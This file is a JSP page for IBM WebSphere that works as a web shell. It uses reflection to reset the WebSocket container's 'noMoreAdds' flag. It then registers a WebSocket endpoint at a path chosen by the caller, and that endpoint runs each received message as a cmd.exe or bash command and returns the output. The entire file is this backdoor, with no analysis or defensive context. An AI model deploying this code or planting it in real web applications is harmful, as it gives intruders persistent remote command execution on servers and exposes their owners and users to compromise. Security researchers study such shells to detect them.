<%@ page import="javax.websocket.server.ServerEndpointConfig" %>
<%@ page import="javax.websocket.*" %>
<%@ page import="java.io.*" %>
<%@ page import="com.ibm.websphere.wsoc.WsWsocServerContainer" %>
<%@ page import="java.lang.reflect.Field" %>

<%!
    public static class WebsphereEndpoint extends Endpoint implements MessageHandler.Whole<String> {
        private Session session;
        @Override
        public void onMessage(String s) {
            try {
                Process process;
                boolean bool = System.getProperty("os.name").toLowerCase().startsWith("windows");
                if (bool) {
                    process = Runtime.getRuntime().exec(new String[] { "cmd.exe", "/c", s });
                } else {
                    process = Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", s });
                }
                InputStream inputStream = process.getInputStream();
                StringBuilder stringBuilder = new StringBuilder();
                int i;
                while ((i = inputStream.read()) != -1)
                    stringBuilder.append((char)i);
                inputStream.close();
                process.waitFor();
                session.getBasicRemote().sendText(stringBuilder.toString());
            } catch (Exception exception) {
                exception.printStackTrace();
            }
        }
        @Override
        public void onOpen(final Session session, EndpointConfig config) {
            this.session = session;
            session.addMessageHandler(this);
        }
    }
%>
<%
    String path = request.getParameter("path");
    ServletContext servletContext = request.getSession().getServletContext();
    ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(WebsphereEndpoint.class, path).build();
    WsWsocServerContainer container = (WsWsocServerContainer) servletContext.getAttribute("javax.websocket.server.ServerContainer");
    Field name = null;
    try {
        name = container.getClass().getDeclaredField("noMoreAdds");
        name.setAccessible(true);
        name.setBoolean(container, false);
        try {
            if (servletContext.getAttribute(path) == null){
                container.addEndpoint(configEndpoint);
                servletContext.setAttribute(path,path);
            }
            out.println("success, connect url path: " + servletContext.getContextPath() + path);
        } catch (Exception e) {
            out.println(e.toString());
        }
    } catch (Exception e) {
        out.println(e.toString());
    }
%>
